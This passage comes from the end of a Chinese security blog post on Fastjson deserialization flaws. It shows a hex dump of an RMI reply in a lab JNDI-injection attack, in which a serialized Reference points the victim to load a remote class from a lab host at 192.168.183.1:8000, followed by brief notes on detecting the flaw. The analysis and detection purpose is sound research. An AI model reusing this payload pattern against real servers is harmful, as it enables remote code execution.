class="number">1</span>:<span class="number">8000</span>/#TouchFil</span><br><span class="line"><span class="attribute">0200</span>   <span class="number">65</span> <span class="number">78</span> <span class="number">70</span> <span class="number">77</span> <span class="number">12</span> <span class="number">00</span> <span class="number">10</span> <span class="number">55</span> <span class="number">6</span>e <span class="number">69</span> <span class="number">63</span> <span class="number">61</span> <span class="number">73</span> <span class="number">74</span> <span class="number">53</span> <span class="number">65</span>   expw...UnicastSe</span><br><span class="line"><span class="attribute">0210</span>   <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">52</span> <span class="number">65</span> <span class="number">66</span> <span class="number">78</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">70</span> <span class="number">70</span> <span class="number">73</span> <span class="number">72</span>   rverRefx....ppsr</span><br><span class="line"><span class="attribute">0220</span>   <span class="number">00</span> <span class="number">16</span> <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">78</span> <span class="number">2</span>e <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">2</span>e <span class="number">52</span>   ..javax.naming.R</span><br><span class="line"><span class="attribute">0230</span>   <span class="number">65</span> <span class="number">66</span> <span class="number">65</span> <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">63</span> <span class="number">65</span> e<span class="number">8</span> c<span class="number">6</span> <span class="number">9</span>e a<span class="number">2</span> a<span class="number">8</span> e<span class="number">9</span> <span class="number">8</span>d <span class="number">09</span>   eference........</span><br><span class="line"><span class="attribute">0240</span>   <span class="number">02</span> <span class="number">00</span> <span class="number">04</span> <span class="number">4</span>c <span class="number">00</span> <span class="number">05</span> <span class="number">61</span> <span class="number">64</span> <span class="number">64</span> <span class="number">72</span> <span class="number">73</span> <span class="number">74</span> <span class="number">00</span> <span class="number">12</span> <span class="number">4</span>c <span class="number">6</span>a   ...L..addrst..Lj</span><br><span class="line"><span class="attribute">0250</span>   <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>f <span class="number">75</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">2</span>f <span class="number">56</span> <span class="number">65</span> <span class="number">63</span> <span class="number">74</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">3</span>b   ava/util/Vector;</span><br><span class="line"><span class="attribute">0260</span>   <span class="number">4</span>c <span class="number">00</span> <span class="number">0</span>c <span class="number">63</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">46</span> <span class="number">61</span> <span class="number">63</span> <span class="number">74</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">79</span> <span class="number">74</span>   L..classFactoryt</span><br><span class="line"><span class="attribute">0270</span>   <span class="number">00</span> <span class="number">12</span> <span class="number">4</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>f <span class="number">6</span>c <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">2</span>f <span class="number">53</span> <span class="number">74</span> <span class="number">72</span>   ..Ljava/lang/Str</span><br><span class="line"><span class="attribute">0280</span>   <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">3</span>b <span class="number">4</span>c <span class="number">00</span> <span class="number">14</span> <span class="number">63</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">46</span> <span class="number">61</span> <span class="number">63</span> <span class="number">74</span>   ing;L..classFact</span><br><span class="line"><span class="attribute">0290</span>   <span class="number">6</span>f <span class="number">72</span> <span class="number">79</span> <span class="number">4</span>c <span class="number">6</span>f <span class="number">63</span> <span class="number">61</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">71</span> <span class="number">00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">0</span>e   oryLocationq.~..</span><br><span class="line"><span class="attribute">02a0</span>   <span class="number">4</span>c <span class="number">00</span> <span class="number">09</span> <span class="number">63</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">4</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">71</span> <span class="number">00</span> <span class="number">7</span>e <span class="number">00</span>   L..classNameq.~.</span><br><span class="line"><span class="attribute">02b0</span>   <span class="number">0</span>e <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span>   .t.$http://<span class="number">192</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">02c0</span>   <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span>   <span class="number">68</span>.<span class="number">183</span>.<span class="number">1</span>:<span class="number">8000</span>/#T</span><br><span class="line"><span class="attribute">02d0</span>   <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">78</span> <span class="number">70</span> <span class="number">73</span> <span class="number">72</span> <span class="number">00</span> <span class="number">10</span> <span class="number">6</span>a <span class="number">61</span>   ouchFilexpsr..ja</span><br><span class="line"><span class="attribute">02e0</span>   <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>e <span class="number">75</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">2</span>e <span class="number">56</span> <span class="number">65</span> <span class="number">63</span> <span class="number">74</span> <span class="number">6</span>f <span class="number">72</span> d<span class="number">9</span> <span class="number">97</span>   va.util.Vector..</span><br><span class="line"><span class="attribute">02f0</span>   <span class="number">7</span>d <span class="number">5</span>b <span class="number">80</span> <span class="number">3</span>b af <span class="number">01</span> <span class="number">03</span> <span class="number">00</span> <span class="number">03</span> <span class="number">49</span> <span class="number">00</span> <span class="number">11</span> <span class="number">63</span> <span class="number">61</span> <span class="number">70</span> <span class="number">61</span>   &#125;[.;.....I..capa</span><br><span class="line"><span class="attribute">0300</span>   <span class="number">63</span> <span class="number">69</span> <span class="number">74</span> <span class="number">79</span> <span class="number">49</span> <span class="number">6</span>e <span class="number">63</span> <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span> <span class="number">49</span> <span class="number">00</span> <span class="number">0</span>c   cityIncrementI..</span><br><span class="line"><span class="attribute">0310</span>   <span class="number">65</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span> <span class="number">43</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">6</span>e <span class="number">74</span> <span class="number">5</span>b <span class="number">00</span> <span class="number">0</span>b <span class="number">65</span>   elementCount[..e</span><br><span class="line"><span class="attribute">0320</span>   <span class="number">6</span>c <span class="number">65</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span> <span class="number">44</span> <span class="number">61</span> <span class="number">74</span> <span class="number">61</span> <span class="number">74</span> <span class="number">00</span> <span class="number">13</span> <span class="number">5</span>b <span class="number">4</span>c <span class="number">6</span>a   lementDatat..[Lj</span><br><span class="line"><span class="attribute">0330</span>   <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>f <span class="number">6</span>c <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">2</span>f <span class="number">4</span>f <span class="number">62</span> <span class="number">6</span>a <span class="number">65</span> <span class="number">63</span> <span class="number">74</span> <span class="number">3</span>b   ava/lang/Object;</span><br><span class="line"><span class="attribute">0340</span>   <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span>   t.$http://<span class="number">192</span>.<span class="number">16</span></span><br><span class="line"><span class="attribute">0350</span>   <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f   <span class="number">8</span>.<span class="number">183</span>.<span class="number">1</span>:<span class="number">8000</span>/#To</span><br><span class="line"><span class="attribute">0360</span>   <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">78</span> <span class="number">70</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   uchFilexp.......</span><br><span class="line"><span class="attribute">0370</span>   <span class="number">00</span> <span class="number">75</span> <span class="number">72</span> <span class="number">00</span> <span class="number">13</span> <span class="number">5</span>b <span class="number">4</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span> <span class="number">2</span>e <span class="number">6</span>c <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span>   .ur..[Ljava.lang</span><br><span class="line"><span class="attribute">0380</span>   <span class="number">2</span>e <span class="number">4</span>f <span class="number">62</span> <span class="number">6</span>a <span class="number">65</span> <span class="number">63</span> <span class="number">74</span> <span class="number">3</span>b <span class="number">90</span> ce <span class="number">58</span> <span class="number">9</span>f <span class="number">10</span> <span class="number">73</span> <span class="number">29</span> <span class="number">6</span>c   .Object;..X..s)l</span><br><span class="line"><span class="attribute">0390</span>   <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span>   ...t.$http://<span class="number">192</span></span><br><span class="line"><span class="attribute">03a0</span>   <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f   .<span class="number">168</span>.<span class="number">183</span>.<span class="number">1</span>:<span class="number">8000</span>/</span><br><span class="line"><span class="attribute">03b0</span>   <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">78</span> <span class="number">70</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a   #TouchFilexp....</span><br><span class="line"><span class="attribute">03c0</span>   <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">70</span> <span class="number">78</span> <span class="number">74</span> <span class="number">00</span> <span class="number">09</span> <span class="number">54</span> <span class="number">6</span>f   ppppppppppxt..To</span><br><span class="line"><span class="attribute">03d0</span>   <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">74</span> <span class="number">00</span> <span class="number">24</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span> <span class="number">3</span>a <span class="number">2</span>f   uchFilet.$http:/</span><br><span class="line"><span class="attribute">03e0</span>   <span class="number">2</span>f <span class="number">31</span> <span class="number">39</span> <span class="number">32</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">36</span> <span class="number">38</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">38</span> <span class="number">33</span> <span class="number">2</span>e <span class="number">31</span> <span class="number">3</span>a <span class="number">38</span>   /<span class="number">192.168.183.1:8</span></span><br><span class="line"><span class="attribute">03f0</span>   <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">2</span>f <span class="number">23</span> <span class="number">54</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">63</span> <span class="number">68</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">74</span> <span class="number">00</span>   <span class="number">000</span>/#TouchFilet.</span><br><span class="line"><span class="attribute">0400</span>   <span class="number">03</span> <span class="number">46</span> <span class="number">6</span>f <span class="number">6</span>f                                       .Foo</span><br></pre></td></tr></table></figure>

<p>0x51 表示 ReturnData，后面是序列化的数据。</p>
<p>到这里，有的文章说还有 Ping(0x52)，Ack(0x53) 和 分布式GC(0x54) 的内容，但我这里妹有看到。</p>
<h3 id="Client-RMI-Server"><a href="#Client-RMI-Server" class="headerlink" title="Client - RMI Server"></a>Client - RMI Server</h3><p>获取到远程调用需要的信息后，开始加载远程类。</p>
<p><code>192.168.183.128:32940 --- 192.168.183.1:8000</code>（tcpstream eq 3)</p>
<p>Client 通过 HTTP 下载远程类</p>
<h3 id="C-实现自动化检测"><a href="#C-实现自动化检测" class="headerlink" title="C# 实现自动化检测"></a>C# 实现自动化检测</h3><p>对于检测来说，检测到以上第四步，即客户端向 RMI Registry 发送 JRMP Call，即可证明存在漏洞。</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Fastjson 漏洞相关</p><p><a href="http://example.com/2021/07/20/fastjson/">http://example.com/2021/07/20/fastjson/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-07-20</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-09-23</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/07/22/vulhub-debug/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">vulhub-debug</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/05/04/basic-pwn/"><span class="level-item">PWN 入门</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">55</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">16</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Powershell/"><span class="level-start"><span class="level-item">Powershell</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/metasploit/"><span class="level-start"><span class="level-item">metasploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/vulnhub/"><span class="level-start"><span class="level-item">vulnhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-12T05:56:35.000Z">2022-07-12</time></p><p class="title"><a href="/2022/07/12/practical-reverse-engineering/">《逆向工程实战》 学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-06T08:39:18.000Z">2021-10-06</time></p><p class="title"><a href="/2021/10/06/etw/">A Primer On Event Tracing For Windows (ETW)</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-18T13:39:32.000Z">2021-09-18</time></p><p class="title"><a href="/2021/09/18/PE/">PE 结构</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-30T05:59:59.000Z">2021-08-30</time></p><p class="title"><a href="/2021/08/30/struts2/">Struts2 漏洞 S2-001</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-22T03:51:23.000Z">2021-07-22</time></p><p class="title"><a href="/2021/07/22/vulhub-debug/">vulhub-debug</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETW/"><span class="tag">ETW</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Powershell/"><span class="tag">Powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Struts2/"><span class="tag">Struts2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows/"><span class="tag">Windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Writeup/"><span class="tag">Writeup</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/metasploit/"><span class="tag">metasploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/shell/"><span class="tag">shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssr/"><span class="tag">ssr</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tables/"><span class="tag">tables</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tricks/"><span class="tag">tricks</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vulnhub/"><span class="tag">vulnhub</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">3</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#概述"><span class="level-left"><span class="level-item">1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#使用"><span class="level-left"><span class="level-item">2</span><span class="level-item">使用</span></span></a></li><li><a class="level is-mobile" href="#环境搭建"><span class="level-left"><span class="level-item">3</span><span class="level-item">环境搭建</span></span></a></li><li><a class="level is-mobile" href="#漏洞利用"><span class="level-left"><span class="level-item">4</span><span class="level-item">漏洞利用</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#FastJSON-1-2-24-反序列化"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">FastJSON 1.2.24 反序列化</span></span></a></li></ul></li><li><a class="level is-mobile" href="#再次研究"><span class="level-left"><span class="level-item">5</span><span class="level-item">再次研究</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#反序列化过程"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">反序列化过程</span></span></a></li><li><a class="level is-mobile" href="#lt-1-2-24"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">&lt;= 1.2.24</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#TemplatesImpl-Gadget"><span class="level-left"><span class="level-item">5.2.1</span><span class="level-item">TemplatesImpl Gadget</span></span></a></li><li><a class="level is-mobile" href="#JDBC-Gadget"><span class="level-left"><span class="level-item">5.2.2</span><span class="level-item">JDBC Gadget</span></span></a></li><li><a class="level is-mobile" href="#修复"><span class="level-left"><span class="level-item">5.2.3</span><span class="level-item">修复</span></span></a></li><li><a class="level is-mobile" href="#loadClass-绕过"><span class="level-left"><span class="level-item">5.2.4</span><span class="level-item">loadClass 绕过</span></span></a></li></ul></li><li><a class="level is-mobile" href="#lt-1-2-47"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">&lt;=1.2.47</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#缓存绕过"><span class="level-left"><span class="level-item">5.3.1</span><span class="level-item">缓存绕过</span></span></a></li></ul></li><li><a class="level is-mobile" href="#lt-1-2-68"><span class="level-left"><span class="level-item">5.4</span><span class="level-item">&lt;= 1.2.68</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#AutoCloseable-绕过"><span class="level-left"><span class="level-item">5.4.1</span><span class="level-item">AutoCloseable 绕过</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#工具"><span class="level-left"><span class="level-item">6</span><span class="level-item">工具</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#详细分析"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">详细分析</span></span></a></li><li><a class="level is-mobile" href="#Client-RMI-Registry"><span class="level-left"><span class="level-item">6.2</span><span class="level-item">Client - RMI Registry</span></span></a></li><li><a class="level is-mobile" href="#Client-RMI-Server"><span class="level-left"><span class="level-item">6.3</span><span class="level-item">Client - RMI Server</span></span></a></li><li><a class="level is-mobile" href="#C-实现自动化检测"><span class="level-left"><span class="level-item">6.4</span><span class="level-item">C# 实现自动化检测</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a><p class="is-size-7"><span>&copy; 2022 lll</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
